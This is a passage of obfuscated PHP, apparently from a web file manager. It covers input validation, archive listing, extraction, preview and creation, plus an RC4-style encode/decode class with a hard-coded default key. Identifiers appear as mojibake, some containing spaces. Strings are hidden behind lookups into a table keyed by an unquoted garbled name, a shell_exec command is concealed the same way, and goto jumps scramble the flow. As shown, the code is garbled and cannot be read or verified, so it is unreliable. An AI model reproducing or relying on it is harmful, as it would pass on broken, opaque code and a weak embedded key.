$F“×µæ = null) { $E¼¤¾¾ÀÊ =& $_SERVER[¬ˆÚÂ”Éğä]; switch ($DˆÎŸ…‰Çß) { case $E¼¤¾¾ÀÊ[7]: return in_array($d•éµÕŸÕÎ, $F“×µæ); break; case $E¼¤¾¾ÀÊ[1898]: return floatval($d•éµÕŸÕÎ) > $F“×µæ; break; case $E¼¤¾¾ÀÊ[1899]: return floatval($d•éµÕŸÕÎ) < $F“×µæ; break; case $E¼¤¾¾ÀÊ[325]: return strlen($d•éµÕŸÕÎ) >= $F“×µæ[0] && strlen($d•éµÕŸÕÎ) <= $F“×µæ[1]; break; case $E¼¤¾¾ÀÊ[325]: if (is_array($F“×µæ)) { return strlen($d•éµÕŸÕÎ) >= $F“×µæ[0] && strlen($d•éµÕŸÕÎ) <= $F“×µæ[1]; break; } else { return strlen($d•éµÕŸÕÎ) == $F“×µæ; break; } case $E¼¤¾¾ÀÊ[321]: return floatval($d•éµÕŸÕÎ) >= $F“×µæ[0] && floatval($d•éµÕŸÕÎ) <= $F“×µæ[1]; break; } $e¬–ñÚêéï = self::reg(!1); $DˆÎŸ…‰Çß = isset($e¬–ñÚêéï[$DˆÎŸ…‰Çß]) ? $e¬–ñÚêéï[$DˆÎŸ…‰Çß] : $DˆÎŸ…‰Çß; if (substr($DˆÎŸ…‰Çß, 0, 1) != $E¼¤¾¾ÀÊ[8]) { $DˆÎŸ…‰Çß = $E¼¤¾¾ÀÊ[1900] . $DˆÎŸ…‰Çß . $E¼¤¾¾ÀÊ[1901]; } return preg_match($DˆÎŸ…‰Çß, $d•éµÕŸÕÎ) === 1; } public static function get($Eº¼È“, $A¬Üã¨ß« = null, $bÁŒÃšµ÷İ = null, $AÅ¿±¦Ôçå = null) { goto AÏ¢Ëõ³£; B¹–‚±¨ğ: if (!is_null($AÅ¿±¦Ôçå)) { $F¦šëÅå˜Å[$A´˜æ–ˆ†[1025]] = $AÅ¿±¦Ôçå; } if (!is_null($A¬Üã¨ß«)) { $F¦šëÅå˜Å[$A´˜æ–ˆ†[1896]] = $A¬Üã¨ß«; } $D®˜‘‘›—¾ = Input::getArray(array($Eº¼È“ => $F¦šëÅå˜Å)); goto bÆï’‚Ã´ß; bÆï’‚Ã´ß: return $D®˜‘‘›—¾[$Eº¼È“]; goto d×ŒÁŸêğ; AÏ¢Ëõ³£: $A´˜æ–ˆ† =& $_SERVER[¬ˆÚÂ”Éğä]; $F¦šëÅå˜Å = array(); if (!is_null($bÁŒÃšµ÷İ)) { $F¦šëÅå˜Å[$A´˜æ–ˆ†[34]] = $bÁŒÃšµ÷İ; } goto B¹–‚±¨ğ; d×ŒÁŸêğ: } } class KodArchive { static function init() { goto aØ¶‡êÊš; aØ¶‡êÊš: $C•¿˜†‡ŒÓ =& $_SERVER[¬ˆÚÂ”Éğä]; if (defined($C•¿˜†‡ŒÓ[1902])) { return; } define($C•¿˜†‡ŒÓ[1902], SDK_DIR . $C•¿˜†‡ŒÓ[1903]); goto Føé¨¿’Ğ˜; Føé¨¿’Ğ˜: define($C•¿˜†‡ŒÓ[1904], TEMP_FILES); define($C•¿˜†‡ŒÓ[1905], TEMP_FILES); define($C•¿˜†‡ŒÓ[1906], $C•¿˜†‡ŒÓ[1907]); goto aÒàİ«¿¥ó; C¨¯Œ×šÜ“: require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1913]; goto DˆÖÑÂºÀ–; c¥¾ô™šÆ®: require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1910]; require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1911]; require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1912]; goto C¨¯Œ×šÜ“; aÒàİ«¿¥ó: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1908]; require_once ARCHIVE_LIB . $C•¿˜†‡ŒÓ[1909]; goto c¥¾ô™šÆ®; DˆÖÑÂºÀ–: } static function checkIfType($c‰™»ÛÓ°, $C°İòßÎ·‡) { goto b…¢Ö«¿Ø; EÏÌƒ êÜí: $EËóºƒ‘…Ú = in_array($c‰™»ÛÓ°, $eøôÚºŒ[$C°İòßÎ·‡]); if ($EËóºƒ‘…Ú && ($C°İòßÎ·‡ == $eÏ·¨¾ÉĞî[301] || $C°İòßÎ·‡ == $eÏ·¨¾ÉĞî[1917]) && (!function_exists($eÏ·¨¾ÉĞî[1925]) || !function_exists($eÏ·¨¾ÉĞî[1926]))) { show_tips($eÏ·¨¾ÉĞî[1927]); } if ($EËóºƒ‘…Ú && $C°İòßÎ·‡ == $eÏ·¨¾ÉĞî[1058] && (!function_exists($eÏ·¨¾ÉĞî[1928]) || !strstr(shell_exec($eÏ·¨¾ÉĞî[1929]), $eÏ·¨¾ÉĞî[1930]))) { show_tips($eÏ·¨¾ÉĞî[1931]); } goto Dóç¢“É¹Ù; Dóç¢“É¹Ù: return $EËóºƒ‘…Ú; goto F–×­»¾ß; b…¢Ö«¿Ø: $eÏ·¨¾ÉĞî =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $eøôÚºŒ = array($eÏ·¨¾ÉĞî[301] => array($eÏ·¨¾ÉĞî[301], $eÏ·¨¾ÉĞî[1914], $eÏ·¨¾ÉĞî[1915], $eÏ·¨¾ÉĞî[1916]), $eÏ·¨¾ÉĞî[1917] => array($eÏ·¨¾ÉĞî[1917], $eÏ·¨¾ÉĞî[1918], $eÏ·¨¾ÉĞî[1056], $eÏ·¨¾ÉĞî[1054]), $eÏ·¨¾ÉĞî[1058] => array($eÏ·¨¾ÉĞî[1058], $eÏ·¨¾ÉĞî[1919], $eÏ·¨¾ÉĞî[1920], $eÏ·¨¾ÉĞî[1921], $eÏ·¨¾ÉĞî[1922], $eÏ·¨¾ÉĞî[1923], $eÏ·¨¾ÉĞî[1924])); goto EÏÌƒ êÜí; F–×­»¾ß: } static function listContent($dÙ¹²ï»µ, $f­¤ÖÉíÆ™ = true) { $D–ÊÃ²Ô¸Ï =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $E‡ê³£Ø­Ú = !empty($GLOBALS[$D–ÊÃ²Ô¸Ï[1062]]) ? $GLOBALS[$D–ÊÃ²Ô¸Ï[1062]] : get_path_ext($dÙ¹²ï»µ); $b›ïÊáË„› = !1; if (self::checkIfType($E‡ê³£Ø­Ú, $D–ÊÃ²Ô¸Ï[1917])) { $BÖš®„»»ª = PclTarList($dÙ¹²ï»µ, $E‡ê³£Ø­Ú); $b›ïÊáË„› = array(); for ($AåÄÎ•Ü­¿ = 0; $AåÄÎ•Ü­¿ < count($BÖš®„»»ª); $AåÄÎ•Ü­¿++) { $dà”±Î¶®… = $BÖš®„»»ª[$AåÄÎ•Ü­¿]; if ($dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1932]] == $D–ÊÃ²Ô¸Ï[1933] || $dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1932]] == $D–ÊÃ²Ô¸Ï[1934]) { continue; } if ($f­¤ÖÉíÆ™) { $dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1935]] = ltrim($dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1935]], $D–ÊÃ²Ô¸Ï[1168]); } if ($dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1932]] == $D–ÊÃ²Ô¸Ï[1936]) { $dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[76]] = !0; } else { $dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[76]] = !1; } $dà”±Î¶®…[$D–ÊÃ²Ô¸Ï[1049]] = $AåÄÎ•Ü­¿; $b›ïÊáË„›[] = $dà”±Î¶®…; } } else { if (self::checkIfType($E‡ê³£Ø­Ú, $D–ÊÃ²Ô¸Ï[1058])) { $bŠó‘°¢³ = kodRarArchive::listContent($dÙ¹²ï»µ); if (!$bŠó‘°¢³[$D–ÊÃ²Ô¸Ï[1045]]) { return $bŠó‘°¢³; } else { $b›ïÊáË„› = $bŠó‘°¢³[$D–ÊÃ²Ô¸Ï[1047]]; } } else { if (kodZipArchive::support($D–ÊÃ²Ô¸Ï[354])) { $b›ïÊáË„› = kodZipArchive::listContent($dÙ¹²ï»µ); } else { $BÂÏµîßç¹ = new PclZip($dÙ¹²ï»µ); $b›ïÊáË„› = $BÂÏµîßç¹->listContent(); } } } if ($b›ïÊáË„›) { $Cªİ×š¾Å­ = unzip_charset_get($b›ïÊáË„›); $f­¤ÖÉíÆ™ = $f­¤ÖÉíÆ™ && function_exists($D–ÊÃ²Ô¸Ï[65]); for ($AåÄÎ•Ü­¿ = 0; $AåÄÎ•Ü­¿ < count($b›ïÊáË„›); $AåÄÎ•Ü­¿++) { $b›ïÊáË„›[$AåÄÎ•Ü­¿][$D–ÊÃ²Ô¸Ï[1935]] = str_replace(array($D–ÊÃ²Ô¸Ï[1085], $D–ÊÃ²Ô¸Ï[1937]), $D–ÊÃ²Ô¸Ï[771], $b›ïÊáË„›[$AåÄÎ•Ü­¿][$D–ÊÃ²Ô¸Ï[1935]]); if ($f­¤ÖÉíÆ™) { $b›ïÊáË„›[$AåÄÎ•Ü­¿][$D–ÊÃ²Ô¸Ï[1935]] = iconv_to($b›ïÊáË„›[$AåÄÎ•Ü­¿][$D–ÊÃ²Ô¸Ï[1935]], $Cªİ×š¾Å­, $D–ÊÃ²Ô¸Ï[326]); unset($b›ïÊáË„›[$AåÄÎ•Ü­¿][$D–ÊÃ²Ô¸Ï[1938]]); } } return array($D–ÊÃ²Ô¸Ï[1045] => !0, $D–ÊÃ²Ô¸Ï[1047] => $b›ïÊáË„›); } else { return array($D–ÊÃ²Ô¸Ï[1045] => !1, $D–ÊÃ²Ô¸Ï[1047] => $b›ïÊáË„›); } } static function extract($E•‚ŠÈùÍ°, $D¡ÓëëãöÓ, $DÊ‚¦äÓ‘ = "\55\x31", &$A·òïâ¨Ë’ = false) { goto FªàØö‡Ë¡; FªàØö‡Ë¡: $F•çíøÒ©‚ =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $Aç…ˆ—à‘¨ = !empty($GLOBALS[$F•çíøÒ©‚[1062]]) ? $GLOBALS[$F•çíøÒ©‚[1062]] : get_path_ext($E•‚ŠÈùÍ°); goto FÀ‚šŠ¿¯Í; f…—ğŞóñ: if (self::checkIfType($Aç…ˆ—à‘¨, $F•çíøÒ©‚[1917])) { if ($DÊ‚¦äÓ‘ != $F•çíøÒ©‚[1044]) { $dˆ–ª ºß = unzip_pre_name($dˆ–ª ºß); $fç°æ¥À£š = unzip_pre_name($fç°æ¥À£š); $aƒ¢Şëï¦Ÿ = PclTarExtractList($E•‚ŠÈùÍ°, array($dˆ–ª ºß), $D¡ÓëëãöÓ, $fç°æ¥À£š, $Aç…ˆ—à‘¨); } else { $aƒ¢Şëï¦Ÿ = PclTarExtract($E•‚ŠÈùÍ°, $D¡ÓëëãöÓ, $F•çíøÒ©‚[361], $Aç…ˆ—à‘¨); } return array($F•çíøÒ©‚[1045] => $aƒ¢Şëï¦Ÿ, $F•çíøÒ©‚[1047] => PclErrorString(!0)); } else { if (self::checkIfType($Aç…ˆ—à‘¨, $F•çíøÒ©‚[1058])) { return kodRarArchive::extract($E•‚ŠÈùÍ°, $D¡ÓëëãöÓ, $Aç…ˆ—à‘¨, $A·òïâ¨Ë’); } else { if (kodZipArchive::support($F•çíøÒ©‚[1939])) { return kodZipArchive::extract($E•‚ŠÈùÍ°, $D¡ÓëëãöÓ, $A·òïâ¨Ë’); } else { $A”ò¨ƒˆ‘ˆ = new PclZip($E•‚ŠÈùÍ°); if ($DÊ‚¦äÓ‘ != $F•çíøÒ©‚[1044]) { $aƒ¢Şëï¦Ÿ = $A”ò¨ƒˆ‘ˆ->extract(PCLZIP_OPT_PATH, $D¡ÓëëãöÓ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F•çíøÒ©‚[1940], PCLZIP_OPT_BY_NAME, $açëİåÛµØ[$F•çíøÒ©‚[1935]], PCLZIP_OPT_REMOVE_PATH, $fç°æ¥À£š, PCLZIP_OPT_REPLACE_NEWER); } else { $aƒ¢Şëï¦Ÿ = $A”ò¨ƒˆ‘ˆ->extract(PCLZIP_OPT_PATH, $D¡ÓëëãöÓ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $F•çíøÒ©‚[1940], PCLZIP_OPT_REPLACE_NEWER); } return array($F•çíøÒ©‚[1045] => $aƒ¢Şëï¦Ÿ, $F•çíøÒ©‚[1047] => $A”ò¨ƒˆ‘ˆ->errorName(!0)); } } } return array($F•çíøÒ©‚[1045] => !1, $F•çíøÒ©‚[1047] => $F•çíøÒ©‚[1941]); goto FÓÖìŸ–‘°; FÀ‚šŠ¿¯Í: $Dèˆ½öèƒ© = self::listContent($E•‚ŠÈùÍ°, !1); if (!$Dèˆ½öèƒ©[$F•çíøÒ©‚[1045]]) { return $Dèˆ½öèƒ©; } if ($DÊ‚¦äÓ‘ != $F•çíøÒ©‚[1044]) { goto EîåÒù—¬ã; EîåÒù—¬ã: $açëİåÛµØ = self::fileIndex($Dèˆ½öèƒ©[$F•çíøÒ©‚[1047]], $DÊ‚¦äÓ‘); $A·òïâ¨Ë’ = str_replace(array($F•çíøÒ©‚[1085], $F•çíøÒ©‚[1937]), $F•çíøÒ©‚[70], $açëİåÛµØ[$F•çíøÒ©‚[1935]]); $dˆ–ª ºß = $A·òïâ¨Ë’; goto b†§¤±ŠÓ; Eì„ë©ïÁà: if ($açëİåÛµØ[$F•çíøÒ©‚[76]]) { $dˆ–ª ºß = rtrim($dˆ–ª ºß, $F•çíøÒ©‚[8]) . $F•çíøÒ©‚[8]; $A·òïâ¨Ë’ = array($A·òïâ¨Ë’); } $D¹ªİĞ¦² = str_replace($F•çíøÒ©‚[93], $F•çíøÒ©‚[8], $dˆ–ª ºß); if (substr($D¹ªİĞ¦², -1) == $F•çíøÒ©‚[8]) { if (!strstr(trim($D¹ªİĞ¦², $F•çíøÒ©‚[8]), $F•çíøÒ©‚[8])) { $D¡ÓëëãöÓ = $D¡ÓëëãöÓ . get_path_this($D¹ªİĞ¦²) . $F•çíøÒ©‚[8]; } } else { if ($fç°æ¥À£š == $dˆ–ª ºß) { $fç°æ¥À£š = $F•çíøÒ©‚[33]; } } goto eËÀßğË×‹; b†§¤±ŠÓ: if ($GLOBALS[$F•çíøÒ©‚[6]][$F•çíøÒ©‚[1166]] != $F•çíøÒ©‚[326]) { $dˆ–ª ºß = unzip_pre_name($A·òïâ¨Ë’); } $fç°æ¥À£š = get_path_father($A·òïâ¨Ë’); if ($fç°æ¥À£š == $A·òïâ¨Ë’) { $fç°æ¥À£š = $F•çíøÒ©‚[33]; } goto Eì„ë©ïÁà; eËÀßğË×‹: } goto f…—ğŞóñ; FÓÖìŸ–‘°: } static function fileIndex($f´øìÙ›­İ, $aöÊÎÃĞËŠ, $f”Æéì††‚ = false) { goto F÷‡´ñãÖ; F÷‡´ñãÖ: $C¦Œóˆáø³ =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); if (!is_array($f´øìÙ›­İ)) { return !1; } goto cÒ¾‚¶®”ƒ; cÒ¾‚¶®”ƒ: $D¢á¾Æ¶àÎ = count($f´øìÙ›­İ); for ($AÚã´é½ = 0; $AÚã´é½ < $D¢á¾Æ¶àÎ; $AÚã´é½++) { if ($aöÊÎÃĞËŠ == $f´øìÙ›­İ[$AÚã´é½][$C¦Œóˆáø³[1049]]) { $c·Âåƒ¤•Í = $f´øìÙ›­İ[$AÚã´é½]; break; } } if (!$c·Âåƒ¤•Í) { show_tips($C¦Œóˆáø³[1942]); } goto F®…ÕçÅø‡; F®…ÕçÅø‡: $dİéòÍÑÛÄ = $c·Âåƒ¤•Í; if ($f”Æéì††‚) { $dİéòÍÑÛÄ = $c·Âåƒ¤•Í[$f”Æéì††‚]; if ($c·Âåƒ¤•Í[$C¦Œóˆáø³[76]]) { $dİéòÍÑÛÄ = rtrim($dİéòÍÑÛÄ, $C¦Œóˆáø³[8]) . $C¦Œóˆáø³[8]; } } return $dİéòÍÑÛÄ; goto CÃñ¡†½óù; CÃñ¡†½óù: } static function extractZipFile($A¢Ã†’Æíƒ, $dÓ¨Ìí‘‰, $Eª‚±ØÈ£ = false) { goto fŸøÔ®ø“Û; cä÷³‚«ºæ: if (!file_exists($fÉ¬Âî¾î)) { return !1; } @rename($fÉ¬Âî¾î, $EöÂ‚˜ì˜); return $EöÂ‚˜ì˜; goto cá„Ïëï¸¶; fŸøÔ®ø“Û: $Eâ‡õìŠç‚ =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $b×¶·î = TEMP_FILES . hash_path($A¢Ã†’Æíƒ) . $Eâ‡õìŠç‚[8]; goto FÌ™ç…´›; FÌ™ç…´›: mk_dir($b×¶·î); $EöÂ‚˜ì˜ = $b×¶·î . md5($A¢Ã†’Æíƒ . $dÓ¨Ìí‘‰); if ($Eª‚±ØÈ£) { $EöÂ‚˜ì˜ = $b×¶·î . $Eª‚±ØÈ£; } goto Bòù×¹·°ë; Bòù×¹·°ë: if (file_exists($EöÂ‚˜ì˜)) { return $EöÂ‚˜ì˜; } $f‚Ùõ“å‡£ = new PclZip($A¢Ã†’Æíƒ); $fÉ¬Âî¾î = unzip_filter_ext($b×¶·î . get_path_this($dÓ¨Ìí‘‰)); goto díØÀôÅªî; díØÀôÅªî: $dßØñ¢Ñ± = get_path_father($dÓ¨Ìí‘‰); if ($dßØñ¢Ñ± == $dÓ¨Ìí‘‰) { $dßØñ¢Ñ± = $Eâ‡õìŠç‚[33]; } $C ¥±¤‹¿‡ = $f‚Ùõ“å‡£->extract(PCLZIP_OPT_PATH, $b×¶·î, PCLZIP_CB_PRE_FILE_NAME, $Eâ‡õìŠç‚[1940], PCLZIP_OPT_REMOVE_PATH, $dßØñ¢Ñ±, PCLZIP_OPT_BY_NAME, $dÓ¨Ìí‘‰); goto cä÷³‚«ºæ; cá„Ïëï¸¶: } static function filePreview($Aö÷ï×¹å½, $aÂ¶Üİ®®‘, $A’©‡Úã = false, $B¿é©Óº›Ñ = false) { goto C¶‡ÔñÑº; d¬ëäƒö”š: $DÚÙÉ‘Òª² = self::extract($Aö÷ï×¹å½, $dÂëÃòÂ, $aÂ¶Üİ®®‘, $Cµ‡ÛÕí); if (is_array($Cµ‡ÛÕí)) { show_json($DÅ»¾Ä•¢Ü[1943], !1); } if (file_exists($b¹µà˜©ò¸)) { IO::fileOut($b¹µà˜©ò¸, $A’©‡Úã, get_path_this($Cµ‡ÛÕí)); return; } goto Dˆƒù¶¼Ø¸; DÔÓŸ÷ß¤˜: if (!$DÚÙÉ‘Òª²[$DÅ»¾Ä•¢Ü[1045]]) { show_json($DÚÙÉ‘Òª²[$DÅ»¾Ä•¢Ü[1047]], !1); } if (!file_exists($DÕˆ­¿åíš)) { show_json($DÅ»¾Ä•¢Ü[1944], !1); } @rename($DÕˆ­¿åíš, $b¹µà˜©ò¸); goto CÚÀ”†ìÌ¿; C¶‡ÔñÑº: $DÅ»¾Ä•¢Ü =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $dÂëÃòÂ = TEMP_FILES . hash_path($Aö÷ï×¹å½) . $DÅ»¾Ä•¢Ü[8]; goto E‰•‚ÈÊÌ; E‰•‚ÈÊÌ: mk_dir($dÂëÃòÂ); $b¹µà˜©ò¸ = $dÂëÃòÂ . md5($Aö÷ï×¹å½ . $aÂ¶Üİ®®‘ . $B¿é©Óº›Ñ); $Cµ‡ÛÕí = $DÅ»¾Ä•¢Ü[33]; goto d¬ëäƒö”š; Dˆƒù¶¼Ø¸: $Cµ‡ÛÕí = unzip_pre_name($Cµ‡ÛÕí); $FŠ¶‚Ë¹† = get_path_this($Cµ‡ÛÕí); $DÕˆ­¿åíš = unzip_filter_ext($dÂëÃòÂ . $FŠ¶‚Ë¹†); goto DÔÓŸ÷ß¤˜; CÚÀ”†ìÌ¿: if (!file_exists($b¹µà˜©ò¸)) { del_dir($dÂëÃòÂ); show_json($DÅ»¾Ä•¢Ü[1945]); } IO::fileOut($b¹µà˜©ò¸, $A’©‡Úã, $FŠ¶‚Ë¹†); goto C‡—‡Ìä†ó; C‡—‡Ìä†ó: } static function create($Bì²êôœ¢Ê, $aõ™¼Ğƒµ) { $A‹Ù¹Û—Û¶ =& $_SERVER[¬ˆÚÂ”Éğä]; self::init(); $d¶ñ¡åã“ì = get_path_ext($Bì²êôœ¢Ê); $bœ¬“åì¢– = !1; if (self::checkIfType($d¶ñ¡åã“ì, $A‹Ù¹Û—Û¶[301])) { if (kodZipArchive::support($A‹Ù¹Û—Û¶[1024])) { return kodZipArchive::create($Bì²êôœ¢Ê, $aõ™¼Ğƒµ); } $d½¨ö¡ÆÑ§ = new PclZip($Bì²êôœ¢Ê); foreach ($aõ™¼Ğƒµ as $AÜË¦ì™•÷ => $CùÏĞÇŠÜŒ) { $CùÏĞÇŠÜŒ = str_replace($A‹Ù¹Û—Û¶[469], $A‹Ù¹Û—Û¶[8], $CùÏĞÇŠÜŒ); $CÇ´‚…«³ = Kodio::clear(get_path_father($CùÏĞÇŠÜŒ)); if ($AÜË¦ì™•÷ == 0) { $bœ¬“åì¢– = $d½¨ö¡ÆÑ§->create($CùÏĞÇŠÜŒ, PCLZIP_OPT_REMOVE_PATH, $CÇ´‚…«³, PCLZIP_CB_PRE_FILE_NAME, $A‹Ù¹Û—Û¶[1946]); continue; } $bœ¬“åì¢– = $d½¨ö¡ÆÑ§->add($CùÏĞÇŠÜŒ, PCLZIP_OPT_REMOVE_PATH, $CÇ´‚…«³, PCLZIP_CB_PRE_FILE_NAME, $A‹Ù¹Û—Û¶[1946]); } } else { if (self::checkIfType($d¶ñ¡åã“ì, $A‹Ù¹Û—Û¶[1917])) { foreach ($aõ™¼Ğƒµ as $AÜË¦ì™•÷ => $CùÏĞÇŠÜŒ) { $CùÏĞÇŠÜŒ = str_replace($A‹Ù¹Û—Û¶[469], $A‹Ù¹Û—Û¶[8], $CùÏĞÇŠÜŒ); $CÇ´‚…«³ = Kodio::clear(get_path_father($CùÏĞÇŠÜŒ)); if ($AÜË¦ì™•÷ == 0) { $bœ¬“åì¢– = PclTarCreate($Bì²êôœ¢Ê, array($CùÏĞÇŠÜŒ), $d¶ñ¡åã“ì, null, $CÇ´‚…«³); continue; } $bœ¬“åì¢– = PclTarAddList($Bì²êôœ¢Ê, array($CùÏĞÇŠÜŒ), $A‹Ù¹Û—Û¶[33], $CÇ´‚…«³, $d¶ñ¡åã“ì); } } } return $bœ¬“åì¢–; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\x61\x6b\101\72\144\x6c\155\143\x6c\x64\x45\x76\x2c\x65"; public static function encode($Bæ¢¾‚È»ø, $Eà¶¦ò¨ÖÒ = '', $AÅ¼†ôÚæˆ = 0, $dëÙƒåô = '') { goto bô‰Á®—òË; D†¿ÖéÊƒ±: $fÖ¡®î¿°Œ = substr($dëÙƒåô, -$C×Åªß©æ); $eìÅŠèÒ×© = $C«À¶ç»µÓ . md5($C«À¶ç»µÓ . $fÖ¡®î¿°Œ); $AøÚùƒÅƒ = strlen($eìÅŠèÒ×©); goto f˜¯„ğŒ™; Fˆ¦œ³ôÅ¢: $E‹Ó›É£‚’ = $fêìßßÔ®[33]; for ($F°©µŠà—ù = $cšÏÃ¡¸”ô = $b¤‹îéëÛ = 0; $b¤‹îéëÛ < $Eô¾“‰»Á; $b¤‹îéëÛ++) { $F°©µŠà—ù = ($F°©µŠà—ù + 1) % 256; $cšÏÃ¡¸”ô = ($cšÏÃ¡¸”ô + $dñò¹ùí„[$F°©µŠà—ù]) % 256; $aÕÙ´‚åˆê = $dñò¹ùí„[$F°©µŠà—ù]; $dñò¹ùí„[$F°©µŠà—ù] = $dñò¹ùí„[$cšÏÃ¡¸”ô]; $dñò¹ùí„[$cšÏÃ¡¸”ô] = $aÕÙ´‚åˆê; $E‹Ó›É£‚’ .= chr(ord($Bæ¢¾‚È»ø[$b¤‹îéëÛ]) ^ $dñò¹ùí„[($dñò¹ùí„[$F°©µŠà—ù] + $dñò¹ùí„[$cšÏÃ¡¸”ô]) % 256]); } $E‹Ó›É£‚’ = $fÖ¡®î¿°Œ . str_replace($fêìßßÔ®[919], $fêìßßÔ®[33], base64_encode($E‹Ó›É£‚’)); goto d —É½œœš; f±£¸¤Ä·´: $C«À¶ç»µÓ = md5(substr($Eà¶¦ò¨ÖÒ, 0, 16)); $fí–ÅôØ¾ = md5(substr($Eà¶¦ò¨ÖÒ, 16, 16)); $dëÙƒåô = $dëÙƒåô ? $dëÙƒåô : md5(microtime()); goto D†¿ÖéÊƒ±; D¼ôÔììöè: for ($b¤‹îéëÛ = 0; $b¤‹îéëÛ <= 255; $b¤‹îéëÛ++) { $Eñ¦œÄÅİ¸[$b¤‹îéëÛ] = ord($eìÅŠèÒ×©[$b¤‹îéëÛ % $AøÚùƒÅƒ]); } $dñò¹ùí„ = range(0, 255); for ($cšÏÃ¡¸”ô = $b¤‹îéëÛ = 0; $b¤‹îéëÛ < 256; $b¤‹îéëÛ++) { $cšÏÃ¡¸”ô = ($cšÏÃ¡¸”ô + $dñò¹ùí„[$b¤‹îéëÛ] + $Eñ¦œÄÅİ¸[$b¤‹îéëÛ]) % 256; $aÕÙ´‚åˆê = $dñò¹ùí„[$b¤‹îéëÛ]; $dñò¹ùí„[$b¤‹îéëÛ] = $dñò¹ùí„[$cšÏÃ¡¸”ô]; $dñò¹ùí„[$cšÏÃ¡¸”ô] = $aÕÙ´‚åˆê; } goto Fˆ¦œ³ôÅ¢; bô‰Á®—òË: $fêìßßÔ® =& $_SERVER[¬ˆÚÂ”Éğä]; $C×Åªß©æ = 4; $Eà¶¦ò¨ÖÒ = md5($Eà¶¦ò¨ÖÒ ? $Eà¶¦ò¨ÖÒ : self::$defaultKey); goto f±£¸¤Ä·´; d —É½œœš: $E‹Ó›É£‚’ = str_replace(array($fêìßßÔ®[284], $fêìßßÔ®[8], $fêìßßÔ®[919]), array($fêìßßÔ®[412], $fêìßßÔ®[70], $fêìßßÔ®[91]), $E‹Ó›É£‚’); return $E‹Ó›É£‚’; goto B™¯ÊÄš…°; f˜¯„ğŒ™: $Bæ¢¾‚È»ø = sprintf($fêìßßÔ®[1947], $AÅ¼†ôÚæˆ ? $AÅ¼†ôÚæˆ + time() : 0) . substr(md5($Bæ¢¾‚È»ø . $fí–ÅôØ¾), 0, 16) . $Bæ¢¾‚È»ø; $Eô¾“‰»Á = strlen($Bæ¢¾‚È»ø); $Eñ¦œÄÅİ¸ = array(); goto D¼ôÔììöè; B™¯ÊÄš…°: } public static function decode($E·ßœ¤÷Æ¼, $AÅ˜Ç¶âœÆ = '') { goto cİë¹Ÿµ; AÑÔø¦‹’Œ: $E·ßœ¤÷Æ¼ = base64_decode(substr($E·ßœ¤÷Æ¼, $D¶çßòØ©ì)); $f¦¨Á¬Ô ­ = strlen($E·ßœ¤÷Æ¼); $FÑ„ŒãÑÚÂ = array(); goto fÚŒ¼ƒ·˜Ê; F¥ë¥Àøš©: $EøÚÜôöÜ = substr($E·ßœ¤÷Æ¼, 0, $D¶çßòØ©ì); $fŒÈ¿”ãË£ = $b¿¸…Íªğ½ . md5($b¿¸…Íªğ½ . $EøÚÜôöÜ); $fçÑ²ˆŠæÊ = strlen($fŒÈ¿”ãË£); goto AÑÔø¦‹’Œ; dõæ½á•‘Ü: if (($fË«ùÄøŠã == 0 || $fË«ùÄøŠã - time() > 0) && substr($a½½ÎÙ„‹ø, 10, 16) == substr(md5(substr($a½½ÎÙ„‹ø, 26) . $dªÖŠ°ì’¯), 0, 16)) { return substr($a½½ÎÙ„‹ø, 26); } else { return $d›–ë§­[33]; } goto AÁ–É‡ŠñŒ; cİë¹Ÿµ: $d›–ë§­ =& $_SERVER[¬ˆÚÂ”Éğä]; $E·ßœ¤÷Æ¼ = str_replace(array($d›–ë§­[412], $d›–ë§­[70], $d›–ë§­[91]), array($d›–ë§­[284], $d›–ë§­[8], $d›–ë§­[919]), $E·ßœ¤÷Æ¼); $D¶çßòØ©ì = 4; goto f›²ÏÂÎŠ; BßÙ‚‚Ü³ã: $a½½ÎÙ„‹ø = $d›–ë§­[33]; for ($dš¥Û†½…Ç = $bÛæŒ¸Ş¹ = $e‰×Ù‰‰› = 0; $e‰×Ù‰‰› < $f¦¨Á¬Ô ­; $e‰×Ù‰‰›++) { $dš¥Û†½…Ç = ($dš¥Û†½…Ç + 1) % 256; $bÛæŒ¸Ş¹ = ($bÛæŒ¸Ş¹ + $FĞ‰¡•¿è[$dš¥Û†½…Ç]) % 256; $DÀê…ŞíÆ… = $FĞ‰¡•¿è[$dš¥Û†½…Ç]; $FĞ‰¡•¿è[$dš¥Û†½…Ç] = $FĞ‰¡•¿è[$bÛæŒ¸Ş¹]; $FĞ‰¡•¿è[$bÛæŒ¸Ş¹] = $DÀê…ŞíÆ…; $a½½ÎÙ„‹ø .= chr(ord($E·ßœ¤÷Æ¼[$e‰×Ù‰‰›]) ^ $FĞ‰¡•¿è[($FĞ‰¡•¿è[$dš¥Û†½…Ç] + $FĞ‰¡•¿è[$bÛæŒ¸Ş¹]) % 256]); } $fË«ùÄøŠã = intval(substr($a½½ÎÙ„‹ø, 0, 10)); goto dõæ½á•‘Ü; fÚŒ¼ƒ·˜Ê: for ($e‰×Ù‰‰› = 0; $e‰×Ù‰‰› <= 255; $e‰×Ù‰‰›++) { $FÑ„ŒãÑÚÂ[$e‰×Ù‰‰›] = ord($fŒÈ¿”ãË£[$e‰×Ù‰‰› % $fçÑ²ˆŠæÊ]); } $FĞ‰¡•¿è = range(0, 255); for ($bÛæŒ¸Ş¹ = 